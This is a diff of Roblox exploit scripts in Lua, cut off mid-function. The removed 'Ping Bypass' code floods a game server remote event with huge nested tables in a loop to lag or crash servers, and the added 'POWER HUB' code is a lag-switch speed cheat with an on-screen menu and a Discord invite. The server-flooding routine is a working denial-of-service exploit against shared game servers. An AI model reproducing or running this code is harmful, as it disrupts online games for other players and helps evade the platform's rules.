@@ -1,594 +1,408 @@
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-
+-- // POWER HUB // Black + White UI (fixed layout, no UIScale)
 local Players = game:GetService("Players")
-local CoreGui = game:GetService("CoreGui")
-local UserInputService = game:GetService("UserInputService")
-local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
-local HttpService = game:GetService("HttpService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local NetworkClient = game:GetService("NetworkClient")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
 
-local LocalPlayer = Players.LocalPlayer
+local lp = Players.LocalPlayer
+local activated = false
+local keybind = Enum.KeyCode.E
+local waitingForKey = false
+local power = 79000
+local lagAmount = 0.15
+local lagConn = nil
+local minimized = false
+local closed = false
 
-local CONFIG = {
-    Names = {
-        ScreenGui = "PingBypass",
-        MainFrame = "Main",
-        Panel = "Panel",
-        ReopenBtn = "Reopen"
-    },
-    Size = {
-        MainFrame = UDim2.new(0, 282, 0, 214),
-        ReopenBtn = UDim2.new(0, 56, 0, 26),
-        Panel = UDim2.new(1, -16, 1, -16),
-        ToggleButton = UDim2.new(1, -4, 0, 46),
-        OptionFrame = UDim2.new(1, -2, 0, 34)
-    },
-    Position = {
-        MainFrame = UDim2.new(0.5, -141, 0.5, -107),
-        ReopenBtn = UDim2.new(0, 20, 0.5, -13),
-        Panel = UDim2.new(0, 8, 0, 8)
-    },
-    Colors = {
-        MainBackground = Color3.fromRGB(18, 18, 18),
-        PanelBackground = Color3.fromRGB(12, 12, 12),
-        OptionBackground = Color3.fromRGB(28, 28, 28),
-        ButtonDisabled = Color3.fromRGB(22, 22, 22),
-        ButtonEnabled = Color3.fromRGB(40, 140, 40),
-        Accent = Color3.fromRGB(60, 130, 240),
-        TextPrimary = Color3.fromRGB(245, 245, 245),
-        TextSecondary = Color3.fromRGB(150, 150, 150)
-    },
-    Text = {
-        Title = "Ping Bypass",
-        Footer = "Standard Menu",
-        DefaultBind = Enum.KeyCode.F
-    },
-    Values = {
-        Option1Default = 22,
-        Option2Default = 120
-    }
-}
+local function applyPower(val)
+    power = math.clamp(val, 10000, 500000)
+    local t = (power - 10000) / 490000
+    lagAmount = t * 0.2
+end
+applyPower(power)
 
-local GUI, MainFrame, ReopenBtn
-local Panel, TitleLabel, ToggleBtn, CloseBtn
-local BindFrame, BindTitle, BindBtn
-local Option1Frame, Opt1Title, Opt1Val, Opt1Minus, Opt1Plus
-local Option2Frame, Opt2Title, Opt2Val, Opt2Minus, Opt2Plus
-local FooterLabel
-
-local isEnabled = false
-local currentBind = CONFIG.Text.DefaultBind
-local isBinding = false
-local opt1Value = CONFIG.Values.Option1Default
-local opt2Value = CONFIG.Values.Option2Default
-
-local laggerEnabled = false
-local laggerThread = nil
-local cachedRemote = nil
-
-local cfg = {
-    lag1 = opt1Value,
-    lag2 = opt2Value,
-    tries = 2,
-    waitTime = 0.045
-}
-
-local function createCorner(parent, radius)
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, radius)
-    corner.Parent = parent
-    return corner
+local function startLag()
+    if lagConn then lagConn:Disconnect() end
+    lagConn = RunService.RenderStepped:Connect(function()
+        if not activated then return end
+        if lagAmount > 0 then
+            local t = tick()
+            while tick() - t < lagAmount do end
+        end
+    end)
 end
 
-local function createStroke(parent, color, thickness, transparency)
-    local stroke = Instance.new("UIStroke")
-    stroke.Color = color
-    stroke.Thickness = thickness
-    stroke.Transparency = transparency
-    stroke.Parent = parent
-    return stroke
+local function stopLag()
+    activated = false
+    if lagConn then
+        lagConn:Disconnect()
+        lagConn = nil
+    end
 end
 
-local function makeDraggable(frame)
-    local dragging, dragInput, dragStart, startPos
+local old = CoreGui:FindFirstChild("PowerHubSpeedBypass")
+if old then old:Destroy() end
 
-    local function update(input)
-        local delta = input.Position - dragStart
-        TweenService:Create(frame, TweenInfo.new(0.1), {
-            Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+local gui = Instance.new("ScreenGui")
+gui.Name = "PowerHubSpeedBypass"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.Parent = CoreGui
+
+local main = Instance.new("Frame")
+main.Name = "Main"
+main.Size = UDim2.new(0, 280, 0, 0)
+main.Position = UDim2.new(0.5, -140, 0.5, -125)
+main.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
+main.BorderSizePixel = 0
+main.Active = true
+main.Draggable = true
+main.ClipsDescendants = true
+main.Parent = gui
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 13)
+mainCorner.Parent = main
+
+local mainStroke = Instance.new("UIStroke")
+mainStroke.Color = Color3.fromRGB(200, 200, 200)
+mainStroke.Thickness = 2
+mainStroke.Transparency = 0.05
+mainStroke.Parent = main
+
+local bgMask = Instance.new("Frame")
+bgMask.Name = "BackgroundMask"
+bgMask.Size = UDim2.new(1, -8, 1, -8)
+bgMask.Position = UDim2.new(0, 4, 0, 4)
+bgMask.BackgroundTransparency = 1
+bgMask.BorderSizePixel = 0
+bgMask.ClipsDescendants = true
+bgMask.ZIndex = 1
+bgMask.Parent = main
+
+local bgMaskCorner = Instance.new("UICorner")
+bgMaskCorner.CornerRadius = UDim.new(0, 9)
+bgMaskCorner.Parent = bgMask
+
+local bgImage = Instance.new("ImageLabel")
+bgImage.Name = "BackgroundImage"
+bgImage.Size = UDim2.fromScale(1, 1)
+bgImage.Position = UDim2.fromScale(0, 0)
+bgImage.BackgroundTransparency = 1
+bgImage.BorderSizePixel = 0
+bgImage.Image = "rbxassetid://97204072864657"
+bgImage.ImageTransparency = 0.12
+bgImage.ScaleType = Enum.ScaleType.Crop
+bgImage.ZIndex = 1
+bgImage.Parent = bgMask
+
+local bgImageCorner = Instance.new("UICorner")
+bgImageCorner.CornerRadius = UDim.new(0, 9)
+bgImageCorner.Parent = bgImage
+
+local darkOverlay = Instance.new("Frame")
+darkOverlay.Name = "DarkOverlay"
+darkOverlay.Size = UDim2.fromScale(1, 1)
+darkOverlay.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+darkOverlay.BackgroundTransparency = 0.72
+darkOverlay.BorderSizePixel = 0
+darkOverlay.ZIndex = 2
+darkOverlay.Parent = main
+
+local overlayCorner = Instance.new("UICorner")
+overlayCorner.CornerRadius = UDim.new(0, 13)
+overlayCorner.Parent = darkOverlay
+
+local header = Instance.new("Frame")
+header.Name = "Header"
+header.Size = UDim2.new(1, 0, 0, 48)
+header.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
+header.BackgroundTransparency = 0.18
+header.BorderSizePixel = 0
+header.ClipsDescendants = true
+header.ZIndex = 5
+header.Parent = main
+
+local headerCorner = Instance.new("UICorner")
+headerCorner.CornerRadius = UDim.new(0, 13)
+headerCorner.Parent = header
+
+local headerLine = Instance.new("Frame")
+headerLine.Size = UDim2.new(1, -20, 0, 1)
+headerLine.Position = UDim2.new(0, 10, 1, -1)
+headerLine.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
+headerLine.BackgroundTransparency = 0.25
+headerLine.BorderSizePixel = 0
+headerLine.ZIndex = 6
+headerLine.Parent = header
+
+local minBtn = Instance.new("TextButton")
+minBtn.Name = "Minimize"
+minBtn.Size = UDim2.new(0, 30, 0, 30)
+minBtn.Position = UDim2.new(0, 8, 0, 9)
+minBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+minBtn.BackgroundTransparency = 0.15
+minBtn.BorderSizePixel = 0
+minBtn.Text = "−"
+minBtn.TextColor3 = Color3.fromRGB(240, 240, 240)
+minBtn.Font = Enum.Font.GothamBold
+minBtn.TextSize = 21
+minBtn.ZIndex = 8
+minBtn.Parent = header
+Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 8)
+
+local closeBtn = Instance.new("TextButton")
+closeBtn.Name = "Close"
+closeBtn.Size = UDim2.new(0, 30, 0, 30)
+closeBtn.Position = UDim2.new(1, -38, 0, 9)
+closeBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+closeBtn.BackgroundTransparency = 0.12
+closeBtn.BorderSizePixel = 0
+closeBtn.Text = "X"
+closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeBtn.Font = Enum.Font.GothamBlack
+closeBtn.TextSize = 13
+closeBtn.ZIndex = 8
+closeBtn.Parent = header
+Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 8)
+
+local title = Instance.new("TextLabel")
+title.Name = "Title"
+title.Size = UDim2.new(1, -84, 0, 23)
+title.Position = UDim2.new(0, 42, 0, 5)
+title.BackgroundTransparency = 1
+title.Text = "POWER HUB ⚡️"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.GothamBlack
+title.TextSize = 14
+title.TextXAlignment = Enum.TextXAlignment.Center
+title.TextTruncate = Enum.TextTruncate.AtEnd
+title.ZIndex = 7
+title.Parent = header
+
+local madeBy = Instance.new("TextLabel")
+madeBy.Name = "MadeBy"
+madeBy.Size = UDim2.new(1, -84, 0, 15)
+madeBy.Position = UDim2.new(0, 42, 0, 26)
+madeBy.BackgroundTransparency = 1
+madeBy.Text = "Made by POWER HUB ⚡️"
+madeBy.TextColor3 = Color3.fromRGB(170, 170, 170)
+madeBy.Font = Enum.Font.GothamMedium
+madeBy.TextSize = 9
+madeBy.TextXAlignment = Enum.TextXAlignment.Center
+madeBy.ZIndex = 7
+madeBy.Parent = header
+
+local content = Instance.new("Frame")
+content.Name = "Content"
+content.Size = UDim2.new(1, -24, 1, -60)
+content.Position = UDim2.new(0, 12, 0, 54)
+content.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
+content.BackgroundTransparency = 0.34
+content.BorderSizePixel = 0
+content.ZIndex = 4
+content.Parent = main
+Instance.new("UICorner", content).CornerRadius = UDim.new(0, 10)
+
+local contentStroke = Instance.new("UIStroke")
+contentStroke.Color = Color3.fromRGB(80, 80, 80)
+contentStroke.Thickness = 1
+contentStroke.Transparency = 0.35
+contentStroke.Parent = content
+
+local toggleBtn = Instance.new("TextButton")
+toggleBtn.Name = "Toggle"
+toggleBtn.Size = UDim2.new(1, -20, 0, 38)
+toggleBtn.Position = UDim2.new(0, 10, 0, 12)
+toggleBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+toggleBtn.BackgroundTransparency = 0.08
+toggleBtn.BorderSizePixel = 0
+toggleBtn.Text = "DISABLED"
+toggleBtn.TextColor3 = Color3.fromRGB(220, 220, 220)
+toggleBtn.Font = Enum.Font.GothamBlack
+toggleBtn.TextSize = 15
+toggleBtn.AutoButtonColor = false
+toggleBtn.ZIndex = 6
+toggleBtn.Parent = content
+Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 9)
+
+local toggleStroke = Instance.new("UIStroke")
+toggleStroke.Color = Color3.fromRGB(80, 80, 80)
+toggleStroke.Thickness = 1
+toggleStroke.Parent = toggleBtn
+
+local bindLabel = Instance.new("TextLabel")
+bindLabel.Size = UDim2.new(0, 92, 0, 26)
+bindLabel.Position = UDim2.new(0, 12, 0, 61)
+bindLabel.BackgroundTransparency = 1
+bindLabel.Text = "Bind"
+bindLabel.TextColor3 = Color3.fromRGB(210, 210, 210)
+bindLabel.Font = Enum.Font.GothamBold
+bindLabel.TextSize = 13
+bindLabel.TextXAlignment = Enum.TextXAlignment.Left
+bindLabel.ZIndex = 6
+bindLabel.Parent = content
+
+local bindBtn = Instance.new("TextButton")
+bindBtn.Size = UDim2.new(0, 74, 0, 28)
+bindBtn.Position = UDim2.new(1, -86, 0, 60)
+bindBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+bindBtn.BackgroundTransparency = 0.08
+bindBtn.BorderSizePixel = 0
+bindBtn.Text = keybind.Name
+bindBtn.TextColor3 = Color3.fromRGB(240, 240, 240)
+bindBtn.Font = Enum.Font.GothamBlack
+bindBtn.TextSize = 13
+bindBtn.AutoButtonColor = false
+bindBtn.ZIndex = 6
+bindBtn.Parent = content
+Instance.new("UICorner", bindBtn).CornerRadius = UDim.new(0, 8)
+
+local powerLabel = Instance.new("TextLabel")
+powerLabel.Size = UDim2.new(0, 140, 0, 28)
+powerLabel.Position = UDim2.new(0, 12, 0, 98)
+powerLabel.BackgroundTransparency = 1
+powerLabel.Text = "Power (10k - 500k)"
+powerLabel.TextColor3 = Color3.fromRGB(210, 210, 210)
+powerLabel.Font = Enum.Font.GothamBold
+powerLabel.TextSize = 12
+powerLabel.TextXAlignment = Enum.TextXAlignment.Left
+powerLabel.ZIndex = 6
+powerLabel.Parent = content
+
+local powerBox = Instance.new("TextBox")
+powerBox.Size = UDim2.new(0, 96, 0, 30)
+powerBox.Position = UDim2.new(1, -108, 0, 97)
+powerBox.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+powerBox.BackgroundTransparency = 0.08
+powerBox.BorderSizePixel = 0
+powerBox.Text = tostring(power)
+powerBox.TextColor3 = Color3.fromRGB(240, 240, 240)
+powerBox.Font = Enum.Font.GothamBlack
+powerBox.TextSize = 13
+powerBox.ClearTextOnFocus = false
+powerBox.ZIndex = 6
+powerBox.Parent = content
+Instance.new("UICorner", powerBox).CornerRadius = UDim.new(0, 8)
+
+local footer = Instance.new("TextLabel")
+footer.Size = UDim2.new(1, -20, 0, 22)
+footer.Position = UDim2.new(0, 10, 1, -32)
+footer.BackgroundTransparency = 1
+footer.Text = "discord.gg/x922udt9fP"
+footer.TextColor3 = Color3.fromRGB(150, 150, 150)
+footer.Font = Enum.Font.GothamMedium
+footer.TextSize = 10
+footer.TextXAlignment = Enum.TextXAlignment.Center
+footer.ZIndex = 6
+footer.Parent = content
+
+local function updateToggleVisual()
+    if activated then
+        toggleBtn.Text = "ENABLED"
+        TweenService:Create(toggleBtn, TweenInfo.new(0.18), {
+            BackgroundColor3 = Color3.fromRGB(240, 240, 240),
+            TextColor3 = Color3.fromRGB(10, 10, 10)
+        }):Play()
+        TweenService:Create(toggleStroke, TweenInfo.new(0.18), {
+            Color = Color3.fromRGB(255, 255, 255),
+            Thickness = 2
+        }):Play()
+    else
+        toggleBtn.Text = "DISABLED"
+        TweenService:Create(toggleBtn, TweenInfo.new(0.18), {
+            BackgroundColor3 = Color3.fromRGB(18, 18, 18),
+            TextColor3 = Color3.fromRGB(220, 220, 220)
+        }):Play()
+        TweenService:Create(toggleStroke, TweenInfo.new(0.18), {
+            Color = Color3.fromRGB(80, 80, 80),
+            Thickness = 1
         }):Play()
     end
-
-    frame.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = true
-            dragStart = input.Position
-            startPos = frame.Position
-
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then
-                    dragging = false
-                end
-            end)
-        end
-    end)
-
-    frame.InputChanged:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-            dragInput = input
-        end
-    end)
-
-    UserInputService.InputChanged:Connect(function(input)
-        if input == dragInput and dragging then
-            update(input)
-        end
-    end)
 end
 
-local function getDirectRemote()
-    local ok, result = pcall(function()
-        return game:GetService("RobloxReplicatedStorage"):FindFirstChild("SetPlayerBlockList")
-    end)
-    if ok and result and (result:IsA("RemoteEvent") or result:IsA("UnreliableRemoteEvent") or result:IsA("RemoteFunction")) then
-        return result
-    end
-    return nil
-end
-
-local function findRemote()
-    if cachedRemote and cachedRemote.Parent then return cachedRemote end
-    local paths = {
-        function() return game:GetService("RobloxReplicatedStorage"):FindFirstChild("SetPlayerBlockList") end,
-        function() return ReplicatedStorage:FindFirstChild("SetPlayerBlockList") end,
-        function() return game:FindFirstChild("SetPlayerBlockList", true) end,
-    }
-    for _, pathFn in ipairs(paths) do
-        local ok, result = pcall(pathFn)
-        if ok and result and (result:IsA("RemoteEvent") or result:IsA("UnreliableRemoteEvent") or result:IsA("RemoteFunction")) then
-            cachedRemote = result; return result
-        end
-    end
-    local services = {ReplicatedStorage, game:FindFirstChild("RobloxReplicatedStorage")}
-    for _, service in ipairs(services) do
-        if service then
-            for _, obj in ipairs(service:GetDescendants()) do
-                if obj:IsA("RemoteEvent") or obj:IsA("UnreliableRemoteEvent") or obj:IsA("RemoteFunction") then
-                    local n = obj.Name:lower()
-                    if n:find("block") or n:find("steal") or n:find("accept")
-                    or n:find("report") or n:find("player") or n:find("lag") then
-                        cachedRemote = obj; return obj
-                    end
-                end
-            end
-        end
-    end
-    for _, service in ipairs(services) do
-        if service then
-            for _, obj in ipairs(service:GetDescendants()) do
-                if obj:IsA("RemoteEvent") or obj:IsA("UnreliableRemoteEvent") then
-                    cachedRemote = obj; return obj
-                end
-            end
-        end
-    end
-    return nil
-end
-
-local function getRemote()
-    return getDirectRemote() or findRemote()
-end
-
-local function bomb(tableincrease, maxCap, tries)
-    local maintable = {}
-    local spammedtable = {{}}
-    local z = spammedtable[1]
-    for i = 1, tableincrease do
-        local t = {}; table.insert(z, t); z = t
-    end
-    local maximum = math.min(99999 / (tableincrease + 2), maxCap * 5)
-    for i = 1, maximum do
-        table.insert(maintable, spammedtable)
-        if i % 5000 == 0 then task.wait() end
-    end
-    local remote = getRemote()
-    if remote then
-        for i = 1, tries do
-            local ok = pcall(function()
-                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
-                    remote:FireServer(maintable)
-                elseif remote:IsA("RemoteFunction") then
-                    remote:InvokeServer(maintable)
-                end
-            end)
-            if not ok then cachedRemote = nil end
-        end
-    end
-end
-
-local function crashLoop()
-    while laggerEnabled do
-        pcall(function() NetworkClient:SetOutgoingKBPSLimit(math.huge) end)
-        pcall(function() settings().Network.IncomingReplicationLag = 0 end)
-        bomb(cfg.lag1, cfg.lag2, cfg.tries)
-        pcall(function()
-            for i = 1, 30 do
-                game:GetService("Stats"):Get("Network.ServerStatsItem")
-            end
-        end)
-        task.wait(cfg.waitTime)
-    end
-end
-
-local function startLagger()
-    if laggerThread then return end
-    laggerEnabled = true
-    laggerThread = coroutine.create(crashLoop)
-    coroutine.resume(laggerThread)
-    updateToggleUI()
-end
-
-local function stopLagger()
-    laggerEnabled = false
-    if laggerThread then
-        pcall(function() coroutine.close(laggerThread) end)
-        laggerThread = nil
-    end
-    updateToggleUI()
-end
-
-local function toggleLagger()
-    if laggerEnabled then
-        stopLagger()
+local function toggle()
+    if activated then
+        stopLag()
     else
-        startLagger()
+        activated = true
+        startLag()
     end
+    updateToggleVisual()
 end
 
-local CONFIG_FILE = "PingBypassConfig"
+toggleBtn.MouseButton1Click:Connect(toggle)
 
-local function saveConfig()
-    local data = {
-        lag1 = cfg.lag1,
-        lag2 = cfg.lag2,
-        tries = cfg.tries,
-        waitTime = cfg.waitTime,
-        key = currentBind.Name,
-        enabled = laggerEnabled
-    }
-    local json = HttpService:JSONEncode(data)
-    pcall(function()
-        writefile(CONFIG_FILE, json)
-    end)
+bindBtn.MouseButton1Click:Connect(function()
+    waitingForKey = true
+    bindBtn.Text = "..."
+    bindBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+end)
+
+powerBox.FocusLost:Connect(function()
+    local val = tonumber(powerBox.Text)
+    if val then applyPower(val) end
+    powerBox.Text = tostring(power)
+end)
+
+local expandedSize = UDim2.new(0, 280, 0, 238)
+local minimizedSize = UDim2.new(0, 280, 0, 48)
+
+local function toggleMinimize()
+    minimized = not minimized
+    content.Visible = not minimized
+    bgMask.Visible = not minimized
+    darkOverlay.Visible = not minimized
+    madeBy.Visible = not minimized
+    minBtn.Text = minimized and "+" or "−"
+
+    TweenService:Create(main, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Size = minimized and minimizedSize or expandedSize
+    }):Play()
 end
+minBtn.MouseButton1Click:Connect(toggleMinimize)
 
-local function loadConfig()
-    local ok, data = pcall(function()
-        return readfile(CONFIG_FILE)
-    end)
-    if ok and data then
-        local decoded = HttpService:JSONDecode(data)
-        cfg.lag1 = decoded.lag1 or cfg.lag1
-        cfg.lag2 = decoded.lag2 or cfg.lag2
-        cfg.tries = decoded.tries or cfg.tries
-        cfg.waitTime = decoded.waitTime or cfg.waitTime
-        if decoded.key then
-            local key = Enum.KeyCode[decoded.key]
-            if key then currentBind = key end
+closeBtn.MouseButton1Click:Connect(function()
+    if closed then return end
+    closed = true
+    stopLag()
+    TweenService:Create(main, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+        Size = UDim2.new(0, 280, 0, 0),
+        BackgroundTransparency = 1
+    }):Play()
+    task.wait(0.22)
+    if gui.Parent then gui:Destroy() end
+end)
+
+UserInputService.InputBegan:Connect(function(input, gpe)
+    if gpe or closed then return end
+
+    if waitingForKey then
+        if input.UserInputType == Enum.UserInputType.Keyboard then
+            keybind = input.KeyCode
+            bindBtn.Text = keybind.Name
+            bindBtn.TextColor3 = Color3.fromRGB(240, 240, 240)
+            waitingForKey = false
         end
-        if decoded.enabled then
-            task.wait(0.5)
-            startLagger()
-        end
-        opt1Value = cfg.lag1
-        opt2Value = cfg.lag2
-        if Opt1Val then Opt1Val.Text = tostring(opt1Value) end
-        if Opt2Val then Opt2Val.Text = tostring(opt2Value) end
-        if BindBtn then BindBtn.Text = currentBind.Name end
-    end
-end
-
-local function createGUI()
-    GUI = Instance.new("ScreenGui")
-    GUI.Name = CONFIG.Names.ScreenGui
-    GUI.ResetOnSpawn = false
-    GUI.DisplayOrder = 999
-    GUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    
-    local success = pcall(function() GUI.Parent = CoreGui end)
-    if not success then GUI.Parent = LocalPlayer:WaitForChild("PlayerGui") end
-
-    MainFrame = Instance.new("Frame")
-    MainFrame.Name = CONFIG.Names.MainFrame
-    MainFrame.Size = CONFIG.Size.MainFrame
-    MainFrame.Position = CONFIG.Position.MainFrame
-    MainFrame.BackgroundColor3 = CONFIG.Colors.MainBackground
-    MainFrame.BorderSizePixel = 0
-    MainFrame.Active = true
-    MainFrame.Parent = GUI
-    
-    createCorner(MainFrame, 10)
-    createStroke(MainFrame, CONFIG.Colors.Accent, 1, 0.5)
-
-    ReopenBtn = Instance.new("TextButton")
-    ReopenBtn.Name = CONFIG.Names.ReopenBtn
-    ReopenBtn.Size = CONFIG.Size.ReopenBtn
-    ReopenBtn.Position = CONFIG.Position.ReopenBtn
-    ReopenBtn.BackgroundColor3 = CONFIG.Colors.ButtonDisabled
-    ReopenBtn.Text = "OPEN"
-    ReopenBtn.TextColor3 = CONFIG.Colors.Accent
-    ReopenBtn.Font = Enum.Font.GothamBold
-    ReopenBtn.TextSize = 12
-    ReopenBtn.Visible = false
-    ReopenBtn.Parent = GUI
-    
-    createCorner(ReopenBtn, 6)
-    createStroke(ReopenBtn, CONFIG.Colors.Accent, 1, 0.4)
-
-    Panel = Instance.new("Frame")
-    Panel.Name = CONFIG.Names.Panel
-    Panel.Size = CONFIG.Size.Panel
-    Panel.Position = CONFIG.Position.Panel
-    Panel.BackgroundTransparency = 1
-    Panel.Parent = MainFrame
-
-    TitleLabel = Instance.new("TextLabel")
-    TitleLabel.Size = UDim2.new(1, -44, 0, 22)
-    TitleLabel.Position = UDim2.new(0, 4, 0, 4)
-    TitleLabel.BackgroundTransparency = 1
-    TitleLabel.Text = CONFIG.Text.Title
-    TitleLabel.TextColor3 = CONFIG.Colors.TextPrimary
-    TitleLabel.Font = Enum.Font.GothamBold
-    TitleLabel.TextSize = 14
-    TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
-    TitleLabel.Parent = Panel
-
-    CloseBtn = Instance.new("TextButton")
-    CloseBtn.Size = UDim2.new(0, 36, 0, 20)
-    CloseBtn.Position = UDim2.new(1, -36, 0, 4)
-    CloseBtn.BackgroundColor3 = CONFIG.Colors.ButtonDisabled
-    CloseBtn.Text = "X"
-    CloseBtn.TextColor3 = CONFIG.Colors.TextPrimary
-    CloseBtn.Font = Enum.Font.GothamBold
-    CloseBtn.TextSize = 12
-    CloseBtn.Parent = Panel
-    createCorner(CloseBtn, 4)
-
-    ToggleBtn = Instance.new("TextButton")
-    ToggleBtn.Size = CONFIG.Size.ToggleButton
-    ToggleBtn.Position = UDim2.new(0, 4, 0, 32)
-    ToggleBtn.BackgroundColor3 = CONFIG.Colors.ButtonDisabled
-    ToggleBtn.Text = "DISABLED"
-    ToggleBtn.TextColor3 = CONFIG.Colors.TextSecondary
-    ToggleBtn.Font = Enum.Font.GothamBold
-    ToggleBtn.TextSize = 16
-    ToggleBtn.Parent = Panel
-    createCorner(ToggleBtn, 6)
-    createStroke(ToggleBtn, CONFIG.Colors.Accent, 1, 0.5)
-
-    local function createOptionRow(yPos, text)
-        local frame = Instance.new("Frame")
-        frame.Size = CONFIG.Size.OptionFrame
-        frame.Position = UDim2.new(0, 4, 0, yPos)
-        frame.BackgroundColor3 = CONFIG.Colors.OptionBackground
-        frame.Parent = Panel
-        createCorner(frame, 6)
-
-        local title = Instance.new("TextLabel")
-        title.Size = UDim2.new(0.5, 0, 1, 0)
-        title.Position = UDim2.new(0, 10, 0, 0)
-        title.BackgroundTransparency = 1
-        title.Text = text
-        title.TextColor3 = CONFIG.Colors.TextPrimary
-        title.Font = Enum.Font.GothamSemibold
-        title.TextSize = 12
-        title.TextXAlignment = Enum.TextXAlignment.Left
-        title.Parent = frame
-
-        return frame, title
+        return
     end
 
-    BindFrame, BindTitle = createOptionRow(84, "Bind")
-    BindBtn = Instance.new("TextButton")
-    BindBtn.Size = UDim2.new(0, 44, 0, 20)
-    BindBtn.Position = UDim2.new(1, -50, 0.5, -10)
-    BindBtn.BackgroundColor3 = CONFIG.Colors.Accent
-    BindBtn.Text = currentBind.Name
-    BindBtn.TextColor3 = CONFIG.Colors.TextPrimary
-    BindBtn.Font = Enum.Font.GothamBold
-    BindBtn.TextSize = 12
-    BindBtn.Parent = BindFrame
-    createCorner(BindBtn, 4)
-
-    Option1Frame, Opt1Title = createOptionRow(122, "Lag 1:")
-    Opt1Minus = Instance.new("TextButton")
-    Opt1Minus.Size = UDim2.new(0, 18, 0, 18)
-    Opt1Minus.Position = UDim2.new(1, -68, 0.5, -9)
-    Opt1Minus.BackgroundColor3 = CONFIG.Colors.MainBackground
-    Opt1Minus.Text = "-"
-    Opt1Minus.TextColor3 = CONFIG.Colors.TextPrimary
-    Opt1Minus.Font = Enum.Font.GothamBold
-    Opt1Minus.Parent = Option1Frame
-    createCorner(Opt1Minus, 4)
-
-    Opt1Val = Instance.new("TextLabel")
-    Opt1Val.Size = UDim2.new(0, 30, 1, 0)
-    Opt1Val.Position = UDim2.new(1, -48, 0, 0)
-    Opt1Val.BackgroundTransparency = 1
-    Opt1Val.Text = tostring(opt1Value)
-    Opt1Val.TextColor3 = CONFIG.Colors.Accent
-    Opt1Val.Font = Enum.Font.GothamBold
-    Opt1Val.TextSize = 13
-    Opt1Val.Parent = Option1Frame
-
-    Opt1Plus = Instance.new("TextButton")
-    Opt1Plus.Size = UDim2.new(0, 18, 0, 18)
-    Opt1Plus.Position = UDim2.new(1, -18, 0.5, -9)
-    Opt1Plus.BackgroundColor3 = CONFIG.Colors.MainBackground
-    Opt1Plus.Text = "+"
-    Opt1Plus.TextColor3 = CONFIG.Colors.TextPrimary
-    Opt1Plus.Font = Enum.Font.GothamBold
-    Opt1Plus.Parent = Option1Frame
-    createCorner(Opt1Plus, 4)
-
-    Option2Frame, Opt2Title = createOptionRow(160, "Lag 2:")
-    Opt2Minus = Instance.new("TextButton")
-    Opt2Minus.Size = UDim2.new(0, 18, 0, 18)
-    Opt2Minus.Position = UDim2.new(1, -68, 0.5, -9)
-    Opt2Minus.BackgroundColor3 = CONFIG.Colors.MainBackground
-    Opt2Minus.Text = "-"
-    Opt2Minus.TextColor3 = CONFIG.Colors.TextPrimary
-    Opt2Minus.Font = Enum.Font.GothamBold
-    Opt2Minus.Parent = Option2Frame
-    createCorner(Opt2Minus, 4)
-
-    Opt2Val = Instance.new("TextLabel")
-    Opt2Val.Size = UDim2.new(0, 30, 1, 0)
-    Opt2Val.Position = UDim2.new(1, -48, 0, 0)
-    Opt2Val.BackgroundTransparency = 1
-    Opt2Val.Text = tostring(opt2Value)
-    Opt2Val.TextColor3 = CONFIG.Colors.Accent
-    Opt2Val.Font = Enum.Font.GothamBold
-    Opt2Val.TextSize = 13
-    Opt2Val.Parent = Option2Frame
-
-    Opt2Plus = Instance.new("TextButton")
-    Opt2Plus.Size = UDim2.new(0, 18, 0, 18)
-    Opt2Plus.Position = UDim2.new(1, -18, 0.5, -9)
-    Opt2Plus.BackgroundColor3 = CONFIG.Colors.MainBackground
-    Opt2Plus.Text = "+"
-    Opt2Plus.TextColor3 = CONFIG.Colors.TextPrimary
-    Opt2Plus.Font = Enum.Font.GothamBold
-    Opt2Plus.Parent = Option2Frame
-    createCorner(Opt2Plus, 4)
-
-    makeDraggable(MainFrame)
-end
-
-function updateToggleUI()
-    if laggerEnabled then
-        ToggleBtn.Text = "ENABLED"
-        ToggleBtn.TextColor3 = CONFIG.Colors.TextPrimary
-        ToggleBtn.BackgroundColor3 = CONFIG.Colors.ButtonEnabled
-    else
-        ToggleBtn.Text = "DISABLED"
